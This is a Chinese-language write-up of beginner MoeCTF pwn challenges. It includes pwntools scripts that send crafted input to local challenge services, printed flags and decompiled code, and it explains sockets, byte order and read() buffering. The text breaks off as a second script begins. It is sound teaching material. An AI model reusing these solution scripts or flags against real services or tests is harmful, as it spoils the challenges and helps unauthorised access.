<!--markdownlint-disable MD033 MD041-->

<div align="center">

# 😈 二进制漏洞审计 题解 🔎

</div>

## 0 二进制漏洞审计

> [!NOTE]
> 准确来说，是星澜音接触到 Pwn 领域的第 1 道题目！星澜音因为初入 Pwn，做第一道题已经是巨大的灾难，所有的工具（例如 Ghidra、IDA Pro 和 Pwntools）都是现学现用的，第 1 道题快给星澜音卡死了😭不过这道题真的让星澜音收获满满，星澜音因为这道题，弄懂了一个之前百思不得其解的问题，收获巨大😋！
>
> **FLAG:** `moectf{the-BEgInNInG-of-FOrmAt7f5438332}`

题目已经给定一个 Pwntools 脚本，我们事实上只需要对它进行适当的修改即可。首先尝试在 WSL2 的 Kali Linux 中运行该可执行文件，得到如下结果：

```plain
┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/0]
└─$ ./pwn
Guess who am i!
⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠶⠶⠶⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡾⠋⠁⢀⣀⣤⣤⣄⣀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡿⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢘⣇⣀⣀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠶⠶⠶⣤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⣿⡀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⡸⢿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠁⣀⣠⣤⣄⣀⡈⠛⢶⡄⠀
⠀⠀⠀⠀⠘⣷⡀⠀⠙⠿⣿⣿⣿⣿⠿⠛⠁⢀⡔⠁⢸⣿⣿⣿⣿⣿⣇⣤⣤⣤⣴⣶⣶⣦⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⣰⣿⣿⣿⣿⣿⣿⣿⣦⡀⢻⡆
⠀⠀⠀⠀⠀⠈⠻⣆⠀⠀⠀⠀⠀⠀⢀⡠⠔⠉⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣁⣀⣀⠉⠙⠛⠷⣦⣤⡀⣴⠷⢶⣤⣀⣼⠏⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻
⠀⠀⠀⠀⠀⣠⡾⠛⠷⣄⠀⠀⠀⠀⠹⡀⠀⠀⠀⠀⢸⣿⡇⣾⣶⡦⠟⠉⠀⠀⠀⠀⠀⣿⠁⠈⠉⠛⠳⣦⣤⣤⣭⣽⡋⣀⣄⡈⣹⠏⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣸
⠀⠀⠀⠀⠸⣿⠀⠰⣿⣿⣷⣄⠀⠀⠀⠙⡄⠀⠀⠀⣸⢻⣇⢸⠟⢡⣀⡀⠀⠀⠀⢀⠀⠉⠀⠀⠀⠀⠀⠀⠰⣶⣾⢹⣷⣿⣿⣿⠏⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⡿⠃⢰⡟
⠀⠀⠀⠀⠀⠹⣧⠀⠻⣿⣿⣿⣷⣤⣀⣀⣘⣄⣤⠾⣣⡾⣻⠆⢀⡞⢩⣟⣦⣄⢀⡿⠀⠀⣿⠀⢀⣠⣴⢶⡆⠙⢣⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⡀⠈⠛⠿⠿⠿⠛⠋⢁⣴⠟⠁
⠀⠀⠀⠀⠀⠀⠙⣷⡀⠹⣿⣿⣿⠘⢯⣍⠉⢉⣠⡾⠋⢸⡏⠀⠘⠛⠛⠛⣛⠛⠘⠛⠛⠛⠿⢷⣿⣿⣿⣤⣷⠄⢾⣿⡟⣫⣽⠀⠀⠀⠀⣠⠋⠈⠒⠠⠤⠀⢠⣠⡾⠛⠁⠀⠀
⠀⠀⠀⠀⠀⢀⣼⠛⣷⣄⣘⣿⣿⣦⣤⣭⠿⠛⠁⠀⠀⣿⣡⡴⡶⠀⠀⠀⠙⢷⣤⣤⣤⣤⣀⣤⡶⠀⠀⠀⠀⠀⢸⡿⢿⡏⢸⣆⠀⢀⠞⠀⠀⠀⠀⢀⣠⣶⣿⣷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⡷⠾⠛⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⢀⣴⣿⠋⠘⠷⣤⡤⠤⠤⠤⠥⢤⣤⣈⣉⡁⠀⠀⠀⠀⣶⢤⣼⡇⠀⠹⣦⡙⠶⣥⣀⣀⣀⣤⣶⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
⠀⠀⣠⣶⠟⠉⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⣠⣶⣶⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠓⠶⠶⠶⠏⠀⢹⣷⡄⠀⠈⣹⢦⣀⠉⣉⡿⢰⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀
⠀⣰⡟⠁⠀⢀⣤⡶⠟⠛⠛⠛⠛⠛⢷⣶⠏⡜⠈⠳⣟⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⢀⣿⣿⣧⣔⡋⠀⠀⠉⠛⢯⣴⣿⡿⠿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⢰⡏⠀⢠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⠀⠀⠀⠈⠳⣽⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠊⠀⠀⢀⣤⣾⣿⣿⠞⠋⢻⡆⠀⠀⠀⠀⠈⠙⠳⣾⣿⣿⡀⠀⠀⠀⠀⠀⠀
⢸⡇⢰⡟⠁⠀⠀⠀⠀⣀⣀⣀⣀⣀⠀⠀⣿⠀⠀⠀⠀⠀⠈⠙⠯⣿⣿⢿⣷⣶⣦⣤⣤⣬⣤⣤⣶⣶⡿⣿⣿⠿⠋⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠘⡛⢿⣇⠀⠀⠀⠀⠀⠀
⢸⣧⡿⠁⠀⣠⣴⠾⠛⠉⠉⠉⠉⠙⠳⣦⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠺⠿⠭⠭⠭⠭⠭⠽⠿⠗⠛⠉⠁⠀⠀⠀⠀⠀⠀⣸⢀⣠⣤⠴⠶⠦⣤⣀⡇⠀⠹⣷⡀⠀⠀⠀⠀
⠀⢻⣇⣰⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠀⠀⠉⠻⣶⡄⢹⣧⠀⠀⠀⠀
⠀⠀⣿⠇⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣡⣤⣤⣤⣄⡀⠀⠀⠀⠀⠈⢿⣦⡿⠀⠀⠀⠀
⠀⢰⡏⠀⠀⢀⣴⠿⠛⠉⠁⠀⠀⠉⠙⠻⢿⣟⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠁⠀⠀⠀⠈⠛⢷⣄⠀⠀⠀⠀⣿⡃⠀⠀⠀⠀
⠀⠸⣧⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⠯⣿⡶⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⢴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡀⠀⠀⢹⡇⠀⠀⠀⠀
⠀⠀⢹⢿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠈⠙⠳⠿⢯⣟⣲⣶⠶⠤⢤⣤⣤⣤⣤⠤⢤⣴⣶⣶⡿⠿⠛⣩⣿⠶⠶⠶⠶⣤⡀⠀⠀⠀⠀⠙⣷⠀⠀⣿⠃⠀⠀⠀⠀
⠀⠀⣾⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⠛⠋⡍⠉⠉⠀⠀⠀⣸⡟⠁⠀⠀⠀⠀⠈⠙⣦⡀⠀⠀⠀⣿⣀⣼⠋⠀⠀⠀⠀⠀
⠀⠀⣿⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⠀⠀⣰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⣾⠋⠁⠀⠀⠀⠀⠀⠀
⠀⠀⢹⡇⠙⣷⣤⣄⣀⠀⠀⣀⣀⣤⣶⢿⣅⠰⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠇⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠘⣧⠉⢩⡟⣯⠉⢹⢁⣟⠀⠙⠳⢿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠀⠀⠀⠀⠀⠻⢒⡿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣆⣠⡿⠷⠟⠋⠉⢷⣤⣼⠋⠙⠳⠶⣤⡉⠻⠿⣷⣶⣤⣀⣀⡀⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⣼⣃⣘⣷⣦⣀⠀⠀⠀⠀⣀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣼⡿⠋⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠈⠻⣦⡀⠀⠉⠛⠺⠿⢿⣿⣒⣶⣦⢿⣤⣤⣤⣤⢤⣶⣖⣾⡿⠟⠛⢻⣋⣻⣿⣶⠶⠟⠛⠁⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⢀⡜⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⢀⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⡀⠴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣷⣶⣦⣤⣄⣀⣀⣀⡀⠀⠀⠀⢀⣀⣀⣀⣤⣴⣶⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣾⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⣿⠀⠈⠉⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢋⣩⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠹⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠏⢠⣿⣤⣀⣀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⡶⠟⠻⣯⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠈⠛⠷⣦⣤⣀⣀⣀⣀⣀⣀⣀⣀⣴⡾⠛⠁⠀⢸⡏⠈⠉⠙⠛⠛⠛⠛⠛⠛⢉⡽⣿⠀⠀⠀⠀⠀⠙⠻⠷⣶⣦⣤⣤⣤⣤⠴⠶⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢿⡄⠀⠀⠀⠀⠀⠉⠙⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠷⢿⣧⡀⢀⣠⣤⣄⣀⠀⠀⠀⢀⣀⣠⣤⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣷⣀⣤⣶⣶⣦⣤⣤⣤⣀⡀⠀⠀⠀⣀⡴⠖⠛⠺⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣏⠁⠀⢈⡝⢳⣤⡞⠋⠁⠀⠀⠹⣻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⡏⠙⠻⣦⣴⠏⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣦⠀⢘⣤⡾⠋⠻⣦⣄⠀⠀⠀⠘⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡇⠀⠀⠀⠀⠀⡠⠚⠀⢀⣠⡼⠟⠷⣤⣀⣀⣀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠁⠀⠀⠀⠀⠉⠛⠳⢦⣤⣤⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣤⣀⣀⣴⣭⡶⠶⠟⠋⠉⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Before u answer me,solve some bypass function!
First,you need to tell me the password.
114511
Right!Then,give the answer.
shuijiangui
Something wrong.
```

很明显文件要求了两个输出。大致猜测脚本意思后，我们直接修改该脚本即可。

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = connect("127.0.0.1", 5896)

io.sendlineafter(b"password.", b"114511")

payload = p32(0xdeadbeef)
payload += b"shuijiangui"
io.sendafter(b"answer.", payload)

io.interactive()
```

执行后即可得到 `flag`，输出如下所示（节选）：

```plain
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x57 bytes:
    b'Before u answer me,solve some bypass function!\n'
    b'First,you need to tell me the password.\n'
[DEBUG] Sent 0x7 bytes:
    b'114511\n'
[DEBUG] Received 0x1b bytes:
    b'Right!Then,give the answer.'
[DEBUG] Sent 0xf bytes:
    00000000  ef be ad de  73 68 75 69  6a 69 61 6e  67 75 69     │····│shui│jian│gui│
    0000000f
[*] Switching to interactive mode
[DEBUG] Received 0x1 bytes:
    b'\n'

[DEBUG] Received 0x52 bytes:
    b'You are right!Now i give u what u want!\n'
    b'moectf{the-BEgInNInG-of-FOrmAt7f5438332}\n'
    b'\n'
You are right!Now i give u what u want!
moectf{the-BEgInNInG-of-FOrmAt7f5438332}

[*] Got EOF while reading in interactive
```

这是容易的，但星澜音在这一过程中被激起极大的好奇心，衍生出了大量的问题——经过询问朋友和 AI 以及查阅各种资料，终于搞明白了一二。下面简要记录当时想到的几个问题：

### 一些衍生出的问题和答案

#### （一）Pwntools 和远程服务器是如何 `connect` 的？是通过 SSH 连接吗？

这其实是星澜音当时最理解不了的点之一。星澜音总认为 Pwntools 是通过类似于 SSH 连接一样的东西连接到远程服务器，然后模拟终端的输入、操作并将输出打回到用户端，但事实上并非如此。我们说，Pwntools 的 `connect` 是通过 **非常底层的 TCP 连接** 得到的。

在绝大多数 CTF Pwn 题目中，主办方会使用一种叫做 `socat` 或 `xinetd` 的工具，它们在服务器上监听一个特定的 TCP 端口，一旦有客户端（比如我们的 Pwntools 脚本）尝试连接到这个端口，它们就会为这个连接启动一个 `pwn` 程序的全新实例，紧接着，将这个程序实例的 **标准输入、标准输出和标准错误**（也就是 `stdin`、`stdout` 和 `stderr`，后面我们还会提到）完完全全地重新定向到这个网络连接上。这建立起了一个非常纯粹而双向的数据通道。

我们使用 Pwntools 去 `send` 数据，该数据会通过 TCP 连接发送到目标服务器，由对方的工具接收后，直接写入到 `pwn` 程序的标准输入中；而 `pwn` 程序通过 `printf` 或 `puts` 打印出的数据，在写入到其标准输出后，也会由工具接收并通过 TCP 连接发送到我们的 Pwntools 端。

这一过程使用的是裸的 TCP/IP 套接字通信：TCP 协议将数据可靠地传递到另一端，但它完全不会修改数据或对数据进行任何的解释和修饰。而我们所说的 SSH 是一个应用层协议，它构建在 TCP 之上，目的是提供一个安全的、加密和认证的远程命令行会话。SSH 的交互是面向人类的、基于文本行的，它会加入大量控制字符和封装。

#### （二）`p32(0xdeadbeef)`、`b"\xde\xad\xbe\xef"`、`b"deadbeef"` 有什么区别？

这是出题人为我们留下的问题。

首先看 `b"\xde\xad\xbe\xef"` 和 `b"deadbeef"`，这二者均为 **字节串**，`b` 表示将后面的东西当做字节处理。我们使用 Python 解释器即可一窥究竟。

```python
In [3]: text_str = "helloworld"

In [4]: type(text_str)
Out[4]: str

In [5]: text_bytes = b"helloworld"

In [6]: type(text_bytes)
Out[6]: bytes
```

可以看到，对于共有部分 `helloworld`，前面有没有 `b` 参数会直接影响变量的类型。那么这两个字节串又有何区别呢？

对于 `b"deadbeef"`。它是一个 ASCII 字符字面量，这种表示方式下，引号内的每一个字符都代表其自身的 ASCII 编码值。Python 会取出引号中的每一个字符，将其转换为对应的 ASCII 码（一个字节），再组合成一个字节串。经过这样的处理，我们会得到一个长度为 8 的 `bytes` 对象。

对于 `b"\xde\xad\xbe\xef`，这实际上使用了转义序列：Python 会将一个 `\x` 后紧跟的两个十六进制数字，直接解析为一个字节的值。经过这样的处理，我们会得到一个长度为 4 的 `bytes` 对象。

那么 `p32(0xdeadbeef)` 呢？首先，`0xdeadbeef` 定义了一个十六进制表示的 32 位整数，而来自 Pwntools 的 `p32` 会将这个整数也打包为一个字节串。但它的打包结果与我们前面所提到的 `b"\xde\xad\xbe\xef"` 不同，或者说——恰好相反！因为 `p32` 函数会按照小端序（Little-Endian）的方式打包数据，它所打包的结果为 `b'\xef\xbe\xad\xde'`。

「大端序」和「小端序」是两种不同的「端序 / 字节序」。大端序要求高位字节在前，正如我们书写数字一般，左边的数字是最高位；而小端序则要求低位字节在前，与我们的习惯相反。而 `p32` 的功能就是将一个 32 位整数打包为小端序字节串，由于它面向的平台是 x86 和 x86-64 架构的 CPU，因此 `p32` 就遵从这一习惯选择了小端序。

#### （三）为何第二次 `send` 请求不使用 `sendlineafter` 而使用 `sendafter`？

倘若我们抛开 `pwn` 文件的内容，单纯从 Pwntools 的 DEBUG 输出中来看，也能窥见其中一二。在我们使用 `sendafter` 时，我们是直接对远程服务器发送了 `p32(0xdeadbeef) + "shuijiangui"` 这一串输入，用十六进制表示就是这样：

```plain
[DEBUG] Sent 0xf bytes:
    00000000  ef be ad de  73 68 75 69  6a 69 61 6e  67 75 69     │····│shui│jian│gui│
    0000000f
```

如此干净利落的 15 个字节。但一旦使用 `sendlineafter`，情况就变了！我们的输入变成了这样：

```plain
[DEBUG] Sent 0x10 bytes:
    00000000  ef be ad de  73 68 75 69  6a 69 61 6e  67 75 69 0a  │····│shui│jian│gui·│
    00000010
```

我们可以清晰地看见，15 个字节之后又追加了一个字节 `0x0a`，它便是这 `line` 所带来的一个换行符。比如说我们进行终端操作，输入了长长一串命令之后敲一下回车，这个回车其实也会带来一个换行符，它追加在这一堆命令之后，被终端一齐送到标准输入（`stdin`）里。

那么为何这个 `pwn` 程序如此看重是否有这个换行符？我们打开 IDA Pro，直接展开逆向！

![使用 IDA Pro 逆向程序](./decompile_program_with_ida_pro.png)

按下 F5 以命令 IDA Pro 尝试将汇编代码转换为伪代码，一般均为类 C 风格的代码。在第二次请求输入时，有如下代码片段：

```c
puts("Right!Then,give the answer.");
read(0, buf, 0x64uLL);
if ( !(unsigned int)bypass(buf) )
{
    puts("You are right!Now i give u what u want!");
    backdoor();
}
```

在 Linux 系统调用中，`read` 是一个原始字节流读取函数，其原型为

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

根据 [read(2) - Linux manual page](https://www.man7.org/linux/man-pages/man2/read.2.html) 给出的解释：

> `read()` attempts to read up to `count` bytes from file descriptor `fd` into the buffer starting at `buf`.

我们看到题目中的 `read` 指令：

```c
read(0, buf, 0x64uLL);
```

它从 `0`（即标准输入 `stdin`）中读取 `0x64` 个字节（也就是 100 个字节）的数据，并存储在目标内存 `buf` 处。接下来，它携带 `buf` 作为参数，调用 `bypass` 函数。首先要注意的一点是，`read` 函数与我们所熟知的 `scanf` 和 `fgets` 等不同，它读取的是 **原始字节流**，并且会将自己读取到的东西 **完整保留**！它既不会向其他函数一样截断 `x00`，也不会跳过或转义空白字符或非打印字符。更重要的是，它仅会从 `stdin` 中取 100 个字节，然后将 `stdin` 的读取指针前移 100 个字节；至于 `stdin` 里是否还有其他等待着的数据，`read` 就不会再管了。

> [!TIP]
> 准确来说，Linux 端的 `read` 函数的行为模式是这样的：首先它会一直阻塞（等待），直到输入缓冲区中有数据供它读取了。一旦有了数据，它就会开始读取，直到以下条件中任一成立，它就会返回（停止阻塞）：
>
> - 已经读取了一定或指定数量的字节；
> - 读取到了文件的末尾（可能是 EOF 结束符）；
> - 遇到了某些非阻塞的情况，没有更多内容可读。
>
> 换句话说，只要 `fd` 中有了数据，`read` 就拿上至多 `count` 字节的数据；哪怕拿到的数据长度远小于 `count`，它也会移动完读取指针后直接跑路！

接下来我们来看 `bypass` 函数：

```c
__int64 __fastcall bypass(__int64 a1)
{
    if ( !a1 )
        return 0LL;
    if ( *(_DWORD *)a1 == -559038737 && !strcmp((const char *)(a1 + 4), "shuijiangui") )
        return 0LL;
    puts("Something wrong.");
    return 1LL;
}
```

`a1` 即 `buf` 的起始地址，也就是一个指针。首先检验 `a1` 是否为空指针，然后：

1. 将 `a1` 强制转换为 `_DWORD*`（32 位无符号整数指针；这里的具体操作是，创建一个 `_DWORD` 指针，并将其指向 `a1` 的起始地址；也就是取 `a1` 的前 4 个字节）并解引用它，检验它的值是否等于 `-559038737`，或者十六进制的 `DEADBEEF`。
2. 将 `a1` 从第 5 个字节开始（`a1 + 4`）强制转换为 `const char`（字符串；这里的具体操作是，创建一个 `const char` 指针，并将其指向 `a1 + 4` 这个地址），调用 `strcmp`（C 语言标准库中的字符串比较函数）对 `(const char *)(a1 + 4)` 和 `"shuijiangui"` 进行比较。一般地，`strcmp` 会对两个字符串的第一个字符开始，逐个字节进行比较，直到遇到空字符 `'\0'` 或不相等的字符为止。

若二者均比对成功，则返回 `0`（`LL` 表示 `long long`，这里是为了符合函数要求的返回类型 `__int64`）并进入 `backdoor()` 流程；否则输出 `Something wrong.` 并返回 `1`。

这么说来我们便理解了：倘若我们使用的是 `sendlineafter`，它便会为我们的输入 `shuijiangui` 后附加一个 `0x0a` 换行符，这样的话，`strcmp` 就会认为第 2 个比较不成功了。

### （四）Pwntools 到底是如何让远程服务器继续下一步操作的？

星澜音更困惑的点便在这里。倘若我们一般使用终端来操作 Linux 程序，我们的常规动作就是，在程序请求用户输入时打一堆文字进去，然后敲下回车键，这样程序就能进行下一步了。但为何这一次，我们使用 `sendafter` 直接发送了数据后，不需要回车键（换行符）就能让程序进行下一步操作？

这里我们需要引入一个概念：**行缓冲（Line Buffering）机制**。我们说缓冲区的类型有三种：全缓冲、行缓冲和无缓冲。

- 全缓冲要求当填满 I/O 缓存后才进行实际 I/O 操作，其代表是对磁盘文件的读写；
- 行缓冲要求在输入和输出中遇到换行符时，才执行真正的 I/O 操作。我们输入的字符会先放在缓冲区，按下回车键后才进行实际的 I/O 操作，其代表是标准输入和标准输出；
- 无缓冲不会进行缓冲，例如标准错误。

一般来讲，我们使用的终端都被配置为了规范模式，也就是运行在行缓冲模式下，这也是为什么我们通常认为，输入完一个东西后，必须要回车才能进行下一步。每当我们敲下回车，终端就会将缓冲区内的数据送到标准输入里；但事实上，程序对于行缓冲是无感的：它不知道你在敲回车键之前是怎么输入的，输入了多少，它只知道标准输入不知为何突然多了一些东西，然后它从标准输入取回这些东西就好了。而标准输入也不总是来自一个配置为行缓冲的交互式终端；它可以来自很多地方，无论是文件重定向、管道、还是像 Pwntools 这样的网络套接字（Socket）。

对于本题的 `pwn` 程序而言，它也感受不到自己正在和网络交互，它只是通过 `read` 函数，从标准输入里读取数据罢了。通过网络套接字传输的数据是没有「行缓冲」这种概念的：你 `send` 了什么，它就 `read` 什么；这就够了。

## 1 ez_u64

> [!NOTE]
> **FLAG:** `moectf{uSEfUl_thlNgs_1n-pwNTO0156775935f}`

继续打开 IDA Pro 逆向。首先定位到 `main` 函数如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    init(argc, argv, envp);
    vuln();
    return 0;
}
```

人畜无害。率先定位到 `init` 函数如下：

```c
int init()
{
    int fd; // [rsp+Ch] [rbp-4h]

    setbuf(stdin, 0LL);
    setbuf(_bss_start, 0LL);
    setbuf(stderr, 0LL);
    fd = open("/dev/urandom", 0, 0LL);
    if ( fd < 0 )
    {
        puts("urandom");
        exit(1);
    }
    read(fd, &num, 8uLL);
    return close(fd);
}
```

程序设置了缓冲区大小为 0，然后设置文件描述符 `fd` 指向 Linux 随机数源设备，读取它的 8 个字节并保存到 `num` 变量中。容易看到这是一个随机数生成器。然后再看 `vuln` 函数：

```c
unsigned __int64 vuln()
{
    __int64 v1; // [rsp+0h] [rbp-10h] BYREF
    unsigned __int64 v2; // [rsp+8h] [rbp-8h]

    v2 = __readfsqword(0x28u);
    puts("Ya hello! Let's play a game.");
    printf("Guess which number I'm thinking of.");
    printf("Here is the hint.");
    write(1, &num, 8uLL);
    printf("\n>");
    __isoc99_scanf("%zu", &v1);
    if ( v1 != num )
    {
        puts("Wrong answer!");
        puts("Try pwntools u64?");
        exit(1);
    }
    puts("Win!");
    system("/bin/sh");
    return v2 - __readfsqword(0x28u);
}
```

在打印完一些文本后，它直接将 `num` 这 8 个字节数据的原始的、二进制的、未经任何处理的值写到了标准输出里！那很简单了：我们只需要截取这 8 个字节，再转成一个整数发送过去，不就行了吗？

构造 Pwntools 脚本：

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = connect("127.0.0.1", 13580)

